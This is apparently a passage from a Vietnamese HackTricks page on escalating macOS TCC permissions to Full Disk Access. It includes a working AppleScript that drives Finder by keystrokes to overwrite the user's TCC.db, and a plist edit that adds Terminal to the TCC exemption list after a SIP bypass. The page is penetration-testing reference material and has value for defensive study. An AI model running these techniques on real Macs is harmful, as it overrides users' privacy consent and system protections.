Automation trên **`System Events`** + Accessibility (**`kTCCServicePostEvent`**) cho phép gửi **phím bấm đến các tiến trình**. Nhờ vậy, bạn có thể lạm dụng Finder để thay đổi TCC.db của người dùng hoặc cấp FDA cho một ứng dụng bất kỳ (mặc dù có thể sẽ được yêu cầu nhập mật khẩu).

Ví dụ Finder ghi đè TCC.db của người dùng:

```applescript
-- store the TCC.db file to copy in /tmp
osascript <<EOF
tell application "System Events"
    -- Open Finder
    tell application "Finder" to activate

    -- Open the /tmp directory
    keystroke "g" using {command down, shift down}
    delay 1
    keystroke "/tmp"
    delay 1
    keystroke return
    delay 1

    -- Select and copy the file
    keystroke "TCC.db"
    delay 1
    keystroke "c" using {command down}
    delay 1

    -- Resolve $HOME environment variable
    set homePath to system attribute "HOME"

    -- Navigate to the Desktop directory under $HOME
    keystroke "g" using {command down, shift down}
    delay 1
    keystroke homePath & "/Library/Application Support/com.apple.TCC"
    delay 1
    keystroke return
    delay 1

    -- Check if the file exists in the destination and delete if it does (need to send keystorke code: https://macbiblioblog.blogspot.com/2014/12/key-codes-for-function-and-special-keys.html)
    keystroke "TCC.db"
    delay 1
    keystroke return
    delay 1
    key code 51 using {command down}
    delay 1

    -- Paste the file
    keystroke "v" using {command down}
end tell
EOF
```

### `kTCCServiceAccessibility` to FDA\*

Xem trang này để tìm một số [**payloads khai thác quyền Accessibility**](macos-tcc-payloads.md#accessibility) nhằm privesc lên FDA\* hoặc chạy keylogger chẳng hạn.

### **Endpoint Security Client to FDA**

Nếu bạn có **`kTCCServiceEndpointSecurityClient`**, bạn có FDA. Hết.

### System Policy SysAdmin File to FDA

**`kTCCServiceSystemPolicySysAdminFiles`** cho phép **thay đổi** thuộc tính **`NFSHomeDirectory`** của người dùng, khiến thư mục home của họ thay đổi và do đó cho phép **bypass TCC**.<sup>[[5]](#references)</sup>

### User TCC DB to FDA

Có được **quyền ghi** vào cơ sở dữ liệu **TCC của người dùng** thì bạn **không thể** tự cấp cho mình quyền **`FDA`**; chỉ cơ sở dữ liệu hệ thống mới có thể cấp quyền đó.

Nhưng bạn **có thể** tự cấp cho mình **quyền Automation đối với Finder**, rồi khai thác kỹ thuật trước đó để leo thang lên FDA\*.

### **FDA to TCC permissions**

Tên TCC của **Full Disk Access** là **`kTCCServiceSystemPolicyAllFiles`**

Tôi không nghĩ đây là một kiểu privesc thực sự, nhưng cứ nêu ra phòng khi bạn thấy hữu ích: Nếu kiểm soát được một chương trình có FDA, bạn có thể **sửa đổi cơ sở dữ liệu TCC của người dùng và tự cấp cho mình bất kỳ quyền truy cập nào**. Việc này có thể hữu ích như một kỹ thuật persistence trong trường hợp bạn mất quyền FDA.

### **SIP Bypass to TCC Bypass**

Cơ sở dữ liệu **TCC** của hệ thống được bảo vệ bởi **SIP**, vì vậy chỉ những tiến trình có **entitlements được chỉ định mới có thể sửa đổi** nó. Do đó, nếu kẻ tấn công tìm được **SIP bypass** đối với một **file** (có thể sửa đổi một file bị SIP hạn chế), họ sẽ có thể:

- **Gỡ bỏ lớp bảo vệ** của cơ sở dữ liệu TCC và tự cấp cho mình mọi quyền TCC. Chẳng hạn, họ có thể khai thác bất kỳ file nào sau đây:
  - Cơ sở dữ liệu TCC của hệ thống
  - REG.db
  - MDMOverrides.plist

Tuy nhiên, còn một cách khác để khai thác **SIP bypass nhằm bypass TCC**: file `/Library/Apple/Library/Bundles/TCC_Compatibility.bundle/Contents/Resources/AllowApplicationsList.plist` là danh sách allow list các ứng dụng cần ngoại lệ TCC. Vì vậy, nếu kẻ tấn công có thể **gỡ bỏ lớp bảo vệ SIP** khỏi file này và thêm **ứng dụng của mình**, ứng dụng đó sẽ có thể bypass TCC.\
Ví dụ, để thêm Terminal:

```bash
# Get needed info
codesign -d -r- /System/Applications/Utilities/Terminal.app
```

AllowApplicationsList.plist:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
	<key>Services</key>
	<dict>
		<key>SystemPolicyAllFiles</key>
		<array>
			<dict>
				<key>CodeRequirement</key>
				<string>identifier &quot;com.apple.Terminal&quot; and anchor apple</string>
				<key>IdentifierType</key>
				<string>bundleID</string>
				<key>Identifier</key>
				<string>com.apple.Terminal</string>
			</dict>
		</array>
	</dict>
</dict>
</plist>
```

### TCC Bypasses


{{#ref}}
macos-tcc-bypasses/
{{#endref}}



## References

- [1] [Tìm hiểu chuyên sâu về macOS TCC.db - Blog Rainforest QA](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive)
- [2] [maclTrack.command - script theo dõi com.apple.macl (Gist của brunerd)](https://gist.githubusercontent.com/brunerd/8bbf9ba66b2a7787e1a6658816f3ad3b/raw/34cabe2751fb487dc7c3de544d1eb4be04701ac5/maclTrack.command)
- [3] [Theo dõi và xử lý com.apple.macl](https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/)
- [4] [Vô tình và có chủ đích vượt qua các biện pháp bảo vệ quyền riêng tư người dùng của macOS TCC](https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/)
- [5] [Thay đổi thư mục home và bypass TCC, hay CVE-2020-27937](https://wojciechregula.blog/post/change-home-directory-and-bypass-tcc-aka-cve-2020-27937/)
- [6] [SQL Injection trong TCC: và tại sao nó (có lẽ) không phải là rủi ro bảo mật (lần này)](https://wts.dev/posts/tcc-sql-injection/)
- [7] [Vị trí và cách thu thập TCC.db trên macOS](https://www.tccparser.com/en/blog/tcc-db-location-acquisition)
- [8] [Cấu hình App Sandbox trên macOS](https://developer.apple.com/documentation/xcode/configuring-the-macos-app-sandbox)
- [9] [Entitlement camera](https://developer.apple.com/documentation/bundleresources/entitlements/com.apple.security.device.camera)
- [10] [Cài đặt payload quản lý thiết bị Privacy Preferences Policy Control cho thiết bị Apple](https://support.apple.com/guide/deployment/privacy-preferences-policy-control-payload-dep38df53c2a/web)
- [11] [Phân tích một vụ xâm nhập macOS từ bước dụ dỗ đến khi xâm nhập thành công](https://www.microsoft.com/en-us/security/blog/2026/04/16/dissecting-sapphire-sleets-macos-intrusion-from-lure-to-compromise/)
{{#include ../../../../banners/hacktricks-training.md}}
